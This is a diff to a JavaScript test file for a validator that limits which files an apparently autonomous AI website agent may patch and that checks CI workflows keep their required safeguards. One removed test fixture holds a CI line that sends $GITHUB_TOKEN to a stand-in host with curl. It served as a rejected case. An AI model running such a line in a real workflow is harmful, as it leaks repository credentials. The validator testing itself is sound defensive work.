@@ -7,6 +7,7 @@ import {
   validateAllowedPatch,
   validateCiWorkflow,
   validateSiteContent,
+  transientRetryDelayMs,
 } from './autonomous-ai-team.mjs';
 
 const originalPost = {
@@ -87,48 +88,9 @@ test('allows only the explicit website patch paths', () => {
       ['diff --git a/styles/main.css b/styles/main.css', '--- a/styles/main.css', '+++ b/styles/main.css'].join('\n'),
     ),
   );
-  assert.doesNotThrow(() =>
-    validateAllowedPatch(['diff --git a/blog.html b/blog.html', '--- a/blog.html', '+++ b/blog.html'].join('\n')),
-  );
-  assert.doesNotThrow(() =>
-    validateAllowedPatch(
-      [
-        'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml',
-        '--- a/.github/workflows/ci.yml',
-        '+++ b/.github/workflows/ci.yml',
-        '@@ -20,1 +20,1 @@',
-        '-        run: npm run old-build',
-        '+        run: npm run build:site',
-      ].join('\n'),
-    ),
-  );
   assert.throws(
-    () =>
-      validateAllowedPatch(
-        [
-          'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml',
-          '--- a/.github/workflows/ci.yml',
-          '+++ b/.github/workflows/ci.yml',
-          '@@ -5,1 +5,1 @@',
-          '-permissions:',
-          '+permissions: {}',
-        ].join('\n'),
-      ),
-    /solo puede ajustar comandos de validación/,
-  );
-  assert.throws(
-    () =>
-      validateAllowedPatch(
-        [
-          'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml',
-          '--- a/.github/workflows/ci.yml',
-          '+++ b/.github/workflows/ci.yml',
-          '@@ -5,1 +5,1 @@',
-          '-        run: npm run test',
-          '+        run: curl https://example.invalid/$GITHUB_TOKEN',
-        ].join('\n'),
-      ),
-    /solo puede ajustar comandos de validación/,
+    () => validateAllowedPatch(['diff --git a/blog.html b/blog.html', '--- a/blog.html', '+++ b/blog.html'].join('\n')),
+    /rutas no autorizadas/,
   );
   assert.throws(
     () =>
@@ -144,10 +106,34 @@ test('allows only the explicit website patch paths', () => {
   assert.throws(
     () =>
       validateAllowedPatch(
+        ['diff --git a/scripts/prerender-site.mjs b/scripts/prerender-site.mjs'].join('\n'),
+      ),
+    /rutas no autorizadas/,
+  );
+  assert.throws(
+    () =>
+      validateAllowedPatch(
+        ['diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml'].join('\n'),
+      ),
+    /rutas no autorizadas/,
+  );
+  assert.throws(
+    () =>
+      validateAllowedPatch(
         ['diff --git a/scripts/app.js b/scripts/app.js', 'old mode 100644', 'new mode 100755'].join('\n'),
       ),
     /no puede crear, borrar, renombrar/,
   );
+});
+
+test('backs off for transient Vertex errors and honors Retry-After', () => {
+  const response = (retryAfter) => ({
+    headers: { get: () => retryAfter },
+  });
+  assert.equal(transientRetryDelayMs(response(null), 0), 10_000);
+  assert.equal(transientRetryDelayMs(response(null), 1), 20_000);
+  assert.equal(transientRetryDelayMs(response('3'), 0), 3_000);
+  assert.equal(transientRetryDelayMs(response('120'), 0), 60_000);
 });
 
 test('preserves required CI validation, deploy, and promotion steps', () => {
@@ -159,9 +145,14 @@ test('preserves required CI validation, deploy, and promotion steps', () => {
     'run: npm run lint:css',
     'run: npm run lint:html',
     'uses: lycheeverse/lychee-action@v2',
+    'args: --verbose .',
+    'run: npm ci',
     'run: npm run a11y',
     'run: npm run lhci:ci',
-    '  deploy-pre:',
+    '  deploy-validated:',
+    'name: Verify main commit was merged through a pull request',
+    'listPullRequestsAssociatedWithCommit',
+    'persist-credentials: false',
     '  publish-ai-evolution:',
     'needs: check',
     'uses: peaceiris/actions-gh-pages@v4',
@@ -171,6 +162,10 @@ test('preserves required CI validation, deploy, and promotion steps', () => {
   assert.doesNotThrow(() => validateCiWorkflow(validWorkflow));
   assert.throws(
     () => validateCiWorkflow(validWorkflow.replace('run: npm run a11y', 'run: echo skipped')),
+    /controles obligatorios/,
+  );
+  assert.throws(
+    () => validateCiWorkflow(validWorkflow.replace('listPullRequestsAssociatedWithCommit', '')),
     /controles obligatorios/,
   );
 });
